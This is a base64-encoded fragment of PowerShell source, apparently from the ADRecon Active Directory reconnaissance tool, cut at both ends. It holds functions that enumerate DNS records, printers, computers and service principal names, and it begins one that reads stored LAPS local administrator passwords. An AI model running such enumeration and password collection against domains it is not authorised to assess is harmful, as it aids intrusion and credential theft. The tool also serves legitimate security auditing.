kVmlld09ubHkgLVZhbHVlIChbc3RyaW5nXSAkKCRfLlByb3BlcnRpZXMuc2hvd2luYWR2YW5jZWR2aWV3b25seSkpCiAgICAgICAgICAgICAgICAgICAgICAgICRPYmpOb2RlIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGlzdGluZ3Vpc2hlZE5hbWUgLVZhbHVlIChbc3RyaW5nXSAkKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpKQogICAgICAgICAgICAgICAgICAgICAgICAkQURETlNOb2Rlc09iaiArPSAkT2JqTm9kZQogICAgICAgICAgICAgICAgICAgICAgICBJZiAoJEROU1JlY29yZCkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEROU1JlY29yZAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgRWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBSZWNvcmRDb3VudCAtVmFsdWUgJG51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRPYmogfCBBZGQtTWVtYmVyIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSBVU05DcmVhdGVkIC1WYWx1ZSAoW3N0cmluZ10gJCgkXy5Qcm9wZXJ0aWVzLnVzbmNyZWF0ZWQpKQogICAgICAgICAgICAgICAgJE9iaiB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIFVTTkNoYW5nZWQgLVZhbHVlIChbc3RyaW5nXSAkKCRfLlByb3BlcnRpZXMudXNuY2hhbmdlZCkpCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgd2hlbkNyZWF0ZWQgLVZhbHVlIChbRGF0ZVRpbWVdICQoJF8uUHJvcGVydGllcy53aGVuY3JlYXRlZCkpCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgd2hlbkNoYW5nZWQgLVZhbHVlIChbRGF0ZVRpbWVdICQoJF8uUHJvcGVydGllcy53aGVuY2hhbmdlZCkpCiAgICAgICAgICAgICAgICAkT2JqIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRGlzdGluZ3Vpc2hlZE5hbWUgLVZhbHVlIChbc3RyaW5nXSAkKCRfLlByb3BlcnRpZXMuZGlzdGluZ3Vpc2hlZG5hbWUpKQogICAgICAgICAgICAgICAgJEFERE5TWm9uZXNPYmogKz0gJE9iagogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBETlMgUmVjb3JkczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURETlNOb2Rlc09iaikpIgogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgRE5TWm9uZUFycmF5CiAgICAgICAgfQogICAgfQoKICAgIElmICgkQURETlNab25lc09iaikKICAgIHsKICAgICAgICBFeHBvcnQtQURSICRBREROU1pvbmVzT2JqICRBRFJPdXRwdXREaXIgJE91dHB1dFR5cGUgIkROU1pvbmVzIgogICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBREROU1pvbmVzT2JqCiAgICB9CgogICAgSWYgKCRBREROU05vZGVzT2JqKQogICAgewogICAgICAgIEV4cG9ydC1BRFIgJEFERE5TTm9kZXNPYmogJEFEUk91dHB1dERpciAkT3V0cHV0VHlwZSAiRE5TTm9kZXMiCiAgICAgICAgUmVtb3ZlLVZhcmlhYmxlIEFERE5TTm9kZXNPYmoKICAgIH0KfQoKRnVuY3Rpb24gR2V0LUFEUlByaW50ZXIKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIHByaW50ZXJzIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4KCi5ERVNDUklQVElPTgogICAgUmV0dXJucyBhbGwgcHJpbnRlcnMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgoKICAgIHBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtzdHJpbmddICRQcm90b2NvbCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtEaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlFbnRyeV0gJG9iakRvbWFpbiwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMAogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRFByaW50ZXJzID0gQCggR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICcob2JqZWN0Q2F0ZWdvcnk9cHJpbnRRdWV1ZSknIC1Qcm9wZXJ0aWVzIGRyaXZlck5hbWUsZHJpdmVyVmVyc2lvbixOYW1lLHBvcnROYW1lLHByaW50U2hhcmVOYW1lLHNlcnZlck5hbWUsdXJsLHdoZW5DaGFuZ2VkLHdoZW5DcmVhdGVkICkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSUHJpbnRlcl0gRXJyb3Igd2hpbGUgZW51bWVyYXRpbmcgcHJpbnRRdWV1ZSBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQoKICAgICAgICBJZiAoJEFEUHJpbnRlcnMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgUHJpbnRlcnM6ICQoW0FEUmVjb24uQURXU0NsYXNzXTo6T2JqZWN0Q291bnQoJEFEUHJpbnRlcnMpKSIKICAgICAgICAgICAgJFByaW50ZXJzT2JqID0gW0FEUmVjb24uQURXU0NsYXNzXTo6UHJpbnRlclBhcnNlcigkQURQcmludGVycywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFByaW50ZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdMREFQJykKICAgIHsKICAgICAgICAkb2JqU2VhcmNoZXIgPSBOZXctT2JqZWN0IFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5EaXJlY3RvcnlTZWFyY2hlciAkb2JqRG9tYWluCiAgICAgICAgJE9ialNlYXJjaGVyLlBhZ2VTaXplID0gJFBhZ2VTaXplCiAgICAgICAgJE9ialNlYXJjaGVyLkZpbHRlciA9ICIob2JqZWN0Q2F0ZWdvcnk9cHJpbnRRdWV1ZSkiCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCgogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEUHJpbnRlcnMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUlByaW50ZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIHByaW50UXVldWUgT2JqZWN0cyIKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0VYQ0VQVElPTl0gJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiCiAgICAgICAgICAgIFJldHVybiAkbnVsbAogICAgICAgIH0KICAgICAgICAkT2JqU2VhcmNoZXIuZGlzcG9zZSgpCgogICAgICAgIElmICgkQURQcmludGVycykKICAgICAgICB7CiAgICAgICAgICAgICRjbnQgPSAkKFtBRFJlY29uLkxEQVBDbGFzc106Ok9iamVjdENvdW50KCRBRFByaW50ZXJzKSkKICAgICAgICAgICAgSWYgKCRjbnQgLWdlIDEpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBQcmludGVyczogJGNudCIKICAgICAgICAgICAgICAgICRQcmludGVyc09iaiA9IFtBRFJlY29uLkxEQVBDbGFzc106OlByaW50ZXJQYXJzZXIoJEFEUHJpbnRlcnMsICRUaHJlYWRzKQogICAgICAgICAgICB9CiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRFByaW50ZXJzCiAgICAgICAgfQogICAgfQoKICAgIElmICgkUHJpbnRlcnNPYmopCiAgICB7CiAgICAgICAgUmV0dXJuICRQcmludGVyc09iagogICAgfQogICAgRWxzZQogICAgewogICAgICAgIFJldHVybiAkbnVsbAogICAgfQp9CgpGdW5jdGlvbiBHZXQtQURSQ29tcHV0ZXIKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIGNvbXB1dGVycyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIGNvbXB1dGVycyBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouUEFSQU1FVEVSIFByb3RvY29sCiAgICBbc3RyaW5nXQogICAgV2hpY2ggcHJvdG9jb2wgdG8gdXNlOyBBRFdTIChkZWZhdWx0KSBvciBMREFQLgoKLlBBUkFNRVRFUiBkYXRlCiAgICBbRGF0ZVRpbWVdCiAgICBEYXRlIHdoZW4gQURSZWNvbiB3YXMgZXhlY3V0ZWQuCgouUEFSQU1FVEVSIG9iakRvbWFpbgogICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XQogICAgRG9tYWluIERpcmVjdG9yeSBFbnRyeSBvYmplY3QuCgouUEFSQU1FVEVSIERvcm1hbnRUaW1lU3BhbgogICAgW2ludF0KICAgIFRpbWVzcGFuIGZvciBEb3JtYW50IGFjY291bnRzLiBEZWZhdWx0IDkwIGRheXMuCgouUEFSQU1URVIgUGFzc01heEFnZQogICAgW2ludF0KICAgIE1heGltdW0gbWFjaGluZSBhY2NvdW50IHBhc3N3b3JkIGFnZS4gRGVmYXVsdCAzMCBkYXlzCiAgICBodHRwczovL2RvY3MubWljcm9zb2Z0LmNvbS9lbi11cy93aW5kb3dzL3NlY3VyaXR5L3RocmVhdC1wcm90ZWN0aW9uL3NlY3VyaXR5LXBvbGljeS1zZXR0aW5ncy9kb21haW4tbWVtYmVyLW1heGltdW0tbWFjaGluZS1hY2NvdW50LXBhc3N3b3JkLWFnZQoKLlBBUkFNRVRFUiBQYWdlU2l6ZQogICAgW2ludF0KICAgIFRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4gRGVmYXVsdCAyMDAuCgouUEFSQU1FVEVSIFRocmVhZHMKICAgIFtpbnRdCiAgICBUaGUgbnVtYmVyIG9mIHRocmVhZHMgdG8gdXNlIGR1cmluZyBwcm9jZXNzaW5nIG9mIG9iamVjdHMuIERlZmF1bHQgMTAuCgouT1VUUFVUUwogICAgUFNPYmplY3QuCiM+CiAgICBwYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbc3RyaW5nXSAkUHJvdG9jb2wsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtEYXRlVGltZV0gJGRhdGUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldICRvYmpEb21haW4sCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtpbnRdICREb3JtYW50VGltZVNwYW4gPSA5MCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhc3NNYXhBZ2UgPSAzMCwKCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW2ludF0gJFBhZ2VTaXplLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW2ludF0gJFRocmVhZHMgPSAxMAogICAgKQoKICAgIElmICgkUHJvdG9jb2wgLWVxICdBRFdTJykKICAgIHsKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRENvbXB1dGVycyA9IEAoIEdldC1BRENvbXB1dGVyIC1GaWx0ZXIgKiAtUmVzdWx0UGFnZVNpemUgJFBhZ2VTaXplIC1Qcm9wZXJ0aWVzIERlc2NyaXB0aW9uLERpc3Rpbmd1aXNoZWROYW1lLEROU0hvc3ROYW1lLEVuYWJsZWQsSVB2NEFkZHJlc3MsTGFzdExvZ29uRGF0ZSwnbXNEUy1BbGxvd2VkVG9EZWxlZ2F0ZVRvJywnbXMtZHMtQ3JlYXRvclNpZCcsJ21zRFMtU3VwcG9ydGVkRW5jcnlwdGlvblR5cGVzJyxOYW1lLE9wZXJhdGluZ1N5c3RlbSxPcGVyYXRpbmdTeXN0ZW1Ib3RmaXgsT3BlcmF0aW5nU3lzdGVtU2VydmljZVBhY2ssT3BlcmF0aW5nU3lzdGVtVmVyc2lvbixQYXNzd29yZExhc3RTZXQscHJpbWFyeUdyb3VwSUQsU2FtQWNjb3VudE5hbWUsU0lELFNJREhpc3RvcnksVHJ1c3RlZEZvckRlbGVnYXRpb24sVHJ1c3RlZFRvQXV0aEZvckRlbGVnYXRpb24sVXNlckFjY291bnRDb250cm9sLHdoZW5DaGFuZ2VkLHdoZW5DcmVhdGVkICkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQ29tcHV0ZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIENvbXB1dGVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURDb21wdXRlcnMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgQ29tcHV0ZXJzOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRENvbXB1dGVycykpIgogICAgICAgICAgICAkQ29tcHV0ZXJPYmogPSBbQURSZWNvbi5BRFdTQ2xhc3NdOjpDb21wdXRlclBhcnNlcigkQURDb21wdXRlcnMsICRkYXRlLCAkRG9ybWFudFRpbWVTcGFuLCAkUGFzc01heEFnZSwgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRENvbXB1dGVycwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJFByb3RvY29sIC1lcSAnTERBUCcpCiAgICB7CiAgICAgICAgJG9ialNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIgJG9iakRvbWFpbgogICAgICAgICRPYmpTZWFyY2hlci5QYWdlU2l6ZSA9ICRQYWdlU2l6ZQogICAgICAgICRPYmpTZWFyY2hlci5GaWx0ZXIgPSAiKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkiCiAgICAgICAgJE9ialNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCJkZXNjcmlwdGlvbiIsImRpc3Rpbmd1aXNoZWRuYW1lIiwiZG5zaG9zdG5hbWUiLCJsYXN0bG9nb250aW1lc3RhbXAiLCJtc0RTLUFsbG93ZWRUb0RlbGVnYXRlVG8iLCJtcy1kcy1DcmVhdG9yU2lkIiwibXNEUy1TdXBwb3J0ZWRFbmNyeXB0aW9uVHlwZXMiLCJuYW1lIiwib2JqZWN0c2lkIiwib3BlcmF0aW5nc3lzdGVtIiwib3BlcmF0aW5nc3lzdGVtaG90Zml4Iiwib3BlcmF0aW5nc3lzdGVtc2VydmljZXBhY2siLCJvcGVyYXRpbmdzeXN0ZW12ZXJzaW9uIiwicHJpbWFyeWdyb3VwaWQiLCJwd2RsYXN0c2V0Iiwic2FtYWNjb3VudG5hbWUiLCJzaWRoaXN0b3J5IiwidXNlcmFjY291bnRjb250cm9sIiwid2hlbmNoYW5nZWQiLCJ3aGVuY3JlYXRlZCIpKQogICAgICAgICRPYmpTZWFyY2hlci5TZWFyY2hTY29wZSA9ICJTdWJ0cmVlIgoKICAgICAgICBUcnkKICAgICAgICB7CiAgICAgICAgICAgICRBRENvbXB1dGVycyA9ICRPYmpTZWFyY2hlci5GaW5kQWxsKCkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQ29tcHV0ZXJdIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIENvbXB1dGVyIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CiAgICAgICAgJE9ialNlYXJjaGVyLmRpc3Bvc2UoKQoKICAgICAgICBJZiAoJEFEQ29tcHV0ZXJzKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiWypdIFRvdGFsIENvbXB1dGVyczogJChbQURSZWNvbi5MREFQQ2xhc3NdOjpPYmplY3RDb3VudCgkQURDb21wdXRlcnMpKSIKICAgICAgICAgICAgJENvbXB1dGVyT2JqID0gW0FEUmVjb24uTERBUENsYXNzXTo6Q29tcHV0ZXJQYXJzZXIoJEFEQ29tcHV0ZXJzLCAkZGF0ZSwgJERvcm1hbnRUaW1lU3BhbiwgJFBhc3NNYXhBZ2UsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURDb21wdXRlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRDb21wdXRlck9iaikKICAgIHsKICAgICAgICBSZXR1cm4gJENvbXB1dGVyT2JqCiAgICB9CiAgICBFbHNlCiAgICB7CiAgICAgICAgUmV0dXJuICRudWxsCiAgICB9Cn0KCkZ1bmN0aW9uIEdldC1BRFJDb21wdXRlclNQTgp7CjwjCi5TWU5PUFNJUwogICAgUmV0dXJucyBhbGwgY29tcHV0ZXIgc2VydmljZSBwcmluY2lwYWwgbmFtZSAoU1BOKSBpbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgouREVTQ1JJUFRJT04KICAgIFJldHVybnMgYWxsIGNvbXB1dGVyIHNlcnZpY2UgcHJpbmNpcGFsIG5hbWUgKFNQTikgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeUVudHJ5XSAkb2JqRG9tYWluLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbaW50XSAkUGFnZVNpemUsCgogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbaW50XSAkVGhyZWFkcyA9IDEwCiAgICApCgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0FEV1MnKQogICAgewogICAgICAgIFRyeQogICAgICAgIHsKICAgICAgICAgICAgJEFEQ29tcHV0ZXJzID0gQCggR2V0LUFET2JqZWN0IC1MREFQRmlsdGVyICIoJihzYW1BY2NvdW50VHlwZT04MDUzMDYzNjkpKHNlcnZpY2VQcmluY2lwYWxOYW1lPSopKSIgLVByb3BlcnRpZXMgTmFtZSxzZXJ2aWNlUHJpbmNpcGFsTmFtZSAtUmVzdWx0UGFnZVNpemUgJFBhZ2VTaXplICkKICAgICAgICB9CiAgICAgICAgQ2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtQURSQ29tcHV0ZXJTUE5dIEVycm9yIHdoaWxlIGVudW1lcmF0aW5nIENvbXB1dGVyU1BOIE9iamVjdHMiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltFWENFUFRJT05dICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgICAgICBSZXR1cm4gJG51bGwKICAgICAgICB9CgogICAgICAgIElmICgkQURDb21wdXRlcnMpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbKl0gVG90YWwgQ29tcHV0ZXJTUE5zOiAkKFtBRFJlY29uLkFEV1NDbGFzc106Ok9iamVjdENvdW50KCRBRENvbXB1dGVycykpIgogICAgICAgICAgICAkQ29tcHV0ZXJTUE5PYmogPSBbQURSZWNvbi5BRFdTQ2xhc3NdOjpDb21wdXRlclNQTlBhcnNlcigkQURDb21wdXRlcnMsICRUaHJlYWRzKQogICAgICAgICAgICBSZW1vdmUtVmFyaWFibGUgQURDb21wdXRlcnMKICAgICAgICB9CiAgICB9CgogICAgSWYgKCRQcm90b2NvbCAtZXEgJ0xEQVAnKQogICAgewogICAgICAgICRvYmpTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyICRvYmpEb21haW4KICAgICAgICAkT2JqU2VhcmNoZXIuUGFnZVNpemUgPSAkUGFnZVNpemUKICAgICAgICAkT2JqU2VhcmNoZXIuRmlsdGVyID0gIigmKHNhbUFjY291bnRUeXBlPTgwNTMwNjM2OSkoc2VydmljZVByaW5jaXBhbE5hbWU9KikpIgogICAgICAgICRPYmpTZWFyY2hlci5Qcm9wZXJ0aWVzVG9Mb2FkLkFkZFJhbmdlKCgibmFtZSIsInNlcnZpY2VwcmluY2lwYWxuYW1lIikpCiAgICAgICAgJE9ialNlYXJjaGVyLlNlYXJjaFNjb3BlID0gIlN1YnRyZWUiCiAgICAgICAgVHJ5CiAgICAgICAgewogICAgICAgICAgICAkQURDb21wdXRlcnMgPSAkT2JqU2VhcmNoZXIuRmluZEFsbCgpCiAgICAgICAgfQogICAgICAgIENhdGNoCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJbR2V0LUFEUkNvbXB1dGVyU1BOXSBFcnJvciB3aGlsZSBlbnVtZXJhdGluZyBDb21wdXRlclNQTiBPYmplY3RzIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRVhDRVBUSU9OXSAkKCRfLkV4Y2VwdGlvbi5NZXNzYWdlKSIKICAgICAgICAgICAgUmV0dXJuICRudWxsCiAgICAgICAgfQogICAgICAgICRPYmpTZWFyY2hlci5kaXNwb3NlKCkKCiAgICAgICAgSWYgKCRBRENvbXB1dGVycykKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlsqXSBUb3RhbCBDb21wdXRlclNQTnM6ICQoW0FEUmVjb24uTERBUENsYXNzXTo6T2JqZWN0Q291bnQoJEFEQ29tcHV0ZXJzKSkiCiAgICAgICAgICAgICRDb21wdXRlclNQTk9iaiA9IFtBRFJlY29uLkxEQVBDbGFzc106OkNvbXB1dGVyU1BOUGFyc2VyKCRBRENvbXB1dGVycywgJFRocmVhZHMpCiAgICAgICAgICAgIFJlbW92ZS1WYXJpYWJsZSBBRENvbXB1dGVycwogICAgICAgIH0KICAgIH0KCiAgICBJZiAoJENvbXB1dGVyU1BOT2JqKQogICAgewogICAgICAgIFJldHVybiAkQ29tcHV0ZXJTUE5PYmoKICAgIH0KICAgIEVsc2UKICAgIHsKICAgICAgICBSZXR1cm4gJG51bGwKICAgIH0KfQoKIyBiYXNlZCBvbiBodHRwczovL2dpdGh1Yi5jb20va2Zvc2FhZW4vR2V0LUxBUFNQYXNzd29yZHMvYmxvYi9tYXN0ZXIvR2V0LUxBUFNQYXNzd29yZHMucHMxCkZ1bmN0aW9uIEdldC1BRFJMQVBTQ2hlY2sKewo8IwouU1lOT1BTSVMKICAgIFJldHVybnMgYWxsIExBUFMgKGxvY2FsIGFkbWluaXN0cmF0b3IpIHN0b3JlZCBwYXNzd29yZHMgaW4gdGhlIGN1cnJlbnQgKG9yIHNwZWNpZmllZCkgZG9tYWluLgoKLkRFU0NSSVBUSU9OCiAgICBSZXR1cm5zIGFsbCBMQVBTIChsb2NhbCBhZG1pbmlzdHJhdG9yKSBzdG9yZWQgcGFzc3dvcmRzIGluIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbi4gT3RoZXIgZGV0YWlscyBzdWNoIGFzIHRoZSBQYXNzd29yZCBFeHBpcmF0aW9uLCB3aGV0aGVyIHRoZSBwYXNzd29yZCBpcyByZWFkYWJsZSBieSB0aGUgY3VycmVudCB1c2VyIGFyZSBhbHNvIHJldHVybmVkLgoKLlBBUkFNRVRFUiBQcm90b2NvbAogICAgW3N0cmluZ10KICAgIFdoaWNoIHByb3RvY29sIHRvIHVzZTsgQURXUyAoZGVmYXVsdCkgb3IgTERBUC4KCi5QQVJBTUVURVIgb2JqRG9tYWluCiAgICBbRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnldCiAgICBEb21haW4gRGlyZWN0b3J5IEVudHJ5IG9iamVjdC4KCi5QQVJBTUVURVIgUGFnZVNpemUKICAgIFtpbnRdCiAgICBUaGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuIERlZmF1bHQgMjAwLgoKLlBBUkFNRVRFUiBUaHJlYWRzCiAgICBbaW50XQogICAgVGhlIG51bWJlciBvZiB0aHJlYWRzIHRvIHVzZSBkdXJpbmcgcHJvY2Vzc2luZyBvZiBvYmplY3RzLiBEZWZhdWx0IDEwLgoKLk9VVFBVVFMKICAgIFBTT2JqZWN0LgojPgogICAgcGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW3N0cmluZ10gJFByb3RvY29sLAoKICAgICAgICBbUGFyYW1ldGVyKE1hbmR